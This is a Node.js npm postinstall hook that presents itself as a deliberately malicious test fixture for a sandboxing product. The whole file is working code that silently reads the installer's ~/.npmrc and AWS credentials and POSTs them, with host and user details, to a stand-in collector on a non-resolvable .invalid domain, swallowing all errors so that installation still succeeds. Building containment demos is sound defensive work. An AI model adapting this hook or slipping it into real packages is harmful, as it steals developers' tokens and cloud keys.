'use strict';

/*
 * postinstall hook for the "left-padder" security-demo fixture.
 *
 * This file is INTENTIONALLY malicious-looking: it is a test fixture used by
 * our sandboxing product to demonstrate that a compromised dependency can be
 * contained. It only ever runs inside an isolated test VM that holds fake
 * canary credentials and blocks the network. The exfiltration endpoint uses
 * the reserved `.invalid` TLD (RFC 2606) so it can never resolve in any real
 * environment.
 *
 * Design constraints:
 *   - Node built-ins only (no shell commands, no dependencies).
 *   - Must never throw or exit non-zero so that `npm install` still succeeds.
 *   - Every error is swallowed (the network is blocked in the demo VM).
 *   - A 5 second timeout bounds how long the hook can run.
 */

const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

function readIfExists(p) {
  try {
    return fs.readFileSync(p, 'utf8');
  } catch (e) {
    return null;
  }
}

function safe(fn, fallback) {
  try {
    return fn();
  } catch (e) {
    return fallback;
  }
}

function main() {
  const home = safe(() => os.homedir(), null);
  if (!home) {
    return;
  }

  // a. read ~/.npmrc and ~/.aws/credentials if they exist
  const npmrc = readIfExists(path.join(home, '.npmrc'));
  const awsCredentials = readIfExists(path.join(home, '.aws', 'credentials'));

  // b. build the JSON payload to POST
  let payload;
  try {
    payload = JSON.stringify({
      npmrc: npmrc,
      awsCredentials: awsCredentials,
      host: safe(() => os.hostname(), null),
      user: safe(() => os.userInfo().username, null),
      platform: safe(() => os.platform(), null),
      arch: safe(() => os.arch(), null),
      cwd: safe(() => process.cwd(), null),
    });
  } catch (e) {
    return;
  }

  // b. send via https to the (non-resolvable) collector endpoint
  let url;
  try {
    url = new URL('https://collector.airlock-demo.invalid/upload');
  } catch (e) {
    return;
  }

  const options = {
    hostname: url.hostname,
    port: url.port || 443,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
    timeout: 5000, // c. 5 second timeout
  };

  let req;
  try {
    req = https.request(options, function (res) {
      // drain the response so the socket can be reused / freed
      res.on('data', function () {});
      res.on('error', function () {});
    });
  } catch (e) {
    return;
  }

  // c. never throw: swallow every error (the network is blocked)
  req.on('timeout', function () {
    try {
      req.destroy();
    } catch (e) {
      /* ignore */
    }
  });

  req.on('error', function () {
    /* swallow: network is blocked in the demo VM */
  });

  try {
    req.write(payload);
    req.end();
  } catch (e) {
    try {
      req.destroy();
    } catch (e2) {
      /* ignore */
    }
  }
}

try {
  main();
} catch (e) {
  // c. must never throw or exit non-zero
}
